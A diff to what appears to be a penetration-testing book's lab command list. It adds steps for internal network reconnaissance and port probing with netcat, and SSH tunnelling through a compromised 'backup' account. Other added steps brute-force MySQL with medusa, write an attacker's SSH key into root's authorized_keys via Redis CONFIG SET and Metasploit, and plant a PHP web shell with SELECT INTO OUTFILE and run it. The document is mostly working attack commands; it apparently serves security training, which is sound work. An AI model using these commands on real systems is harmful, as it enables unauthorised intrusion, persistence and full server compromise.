@@ -355,6 +355,9 @@ tail -n 20 /etc/pam.d/common-session
 # Rogue SSH Keys
 
 ssh-keygen -t rsa -C ""
+mkdir ~/.ssh && chmod 700 ~/.ssh
+touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+ssh-copy-id -i ~/.ssh/id_rsa.pub backup@172.16.10.13
 ssh backup@172.16.10.13 -i ~/.ssh/id_rsa
 
 # Repurposing Default System Accounts
@@ -385,7 +388,6 @@ nc -lkvp 8080
 
 touch /etc/profile.d/99-stream.sh
 socat TCP4-LISTEN:4444,fork STDOUT
-python -m http.server 8080
 
 # Distributing Malicious Package
 
@@ -415,3 +417,92 @@ cat /etc/crontab
 
 sudo crontab -u root -l
 crontab -u backup -l
+
+
+# Probing Corporate Network
+
+cat /etc/services | tail
+cat /etc/services | grep ssh
+bash ./ch11/port_scan_etc_services.sh 172.16.10.1
+bash ./ch11/port_scan_etc_services.sh 10.1.0.13 10.1.0.14
+
+nc -i 1 10.1.0.13 -v 22
+nc -i 1 10.1.0.13 -v 8080
+nc -v 10.1.0.13 8080
+timeout 5 nc -v 10.1.0.14 6379
+echo -e '\nINFO' | nc -v 10.1.0.13 22
+echo -e '\nINFO' | nc -v 10.1.0.13 8080
+echo -e '\nINFO' | nc -v 10.1.0.14 6379
+
+cat /usr/share/nmap/nmap-services | tail
+grep -w -e 22/tcp -e 23/tcp -e 3306/tcp -e 1433/tcp /usr/share/nmap/nmap-services
+grep "tcp" /usr/share/nmap/nmap-services | sort -r -k 3 | awk '{print $1, $2, $3}' | head
+
+# Shared Volumes
+
+df -hTP | grep /mnt/scripts
+mount | grep /mnt/scripts
+
+watch -d 'ls -l'
+
+curl http://172.16.10.1:8080/playground/nc -o $(pwd)/nc
+python -m http.server 8080 &
+
+# Exploiting Database Server
+
+nc -v 10.1.0.16 3306
+ssh -v -N -L 3306:10.1.0.16:3306 backup@172.16.10.13
+netstat -atunp | grep 3306
+
+medusa -h 127.0.0.1 \
+    -u root \
+    -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
+    -M mysql
+
+mysql -h 127.0.0.1 -u root -p
+mysql -h 127.0.0.1 -u root -p --skip-ssl
+
+# Compromising Redis Server
+
+ssh -v -N -L 6379:10.1.0.14:6379 backup@172.16.10.13
+netstat -atunp | grep 6379
+redis-cli -h 127.0.0.1 -p 6379
+
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SET k1 "\n\nssh-rsa AAAAB3Nz...= kali@kali\n\n" # this is public key id_rsa.pub
+
+ssh -v -N -L 2222:10.1.0.14:22 backup@172.16.10.13
+netstat -atunp | grep 2222
+ssh root@127.0.0.1 -p 2222 -i /home/kali/.ssh/id_rsa
+
+# Metasplot
+
+msfconsole
+use auxiliary/scanner/redis/file_upload
+show options
+set LocalFile "/home/kali/.ssh/id_rsa.pub"
+set RemoteFile "/root/.ssh/authorized_keys"
+set RHOST 127.0.0.1
+
+# Exposed Database Files
+
+ssh -v -N -L 8888:10.1.0.15:80 backup@172.16.10.13
+netstat -atunp | grep 8888
+dirsearch -u http://localhost:8888
+http://localhost:8888/adminer.php
+http://localhost:8888/database.sql
+http://localhost:8888/uploads
+curl http://localhost:8888/database.sql -o database.sql
+
+select * from acme_hyper_branding
+select * from acme_impact _alliance
+
+SELECT "test_write1" into OUTFILE "file_write1.txt"
+SELECT "test_write2" into OUTFILE "/var/www/html/file_write2.txt"
+SELECT "test_write3" into OUTFILE "/var/www/html/uploads/file_write3.txt"
+http://localhost:8888/uploads/file_write3.txt
+
+SELECT "<?php system($_GET['cmd']); ?>" into OUTFILE "/var/www/html/uploads/s.php"
+http://localhost:8888/uploads/s.php?cmd=id
+
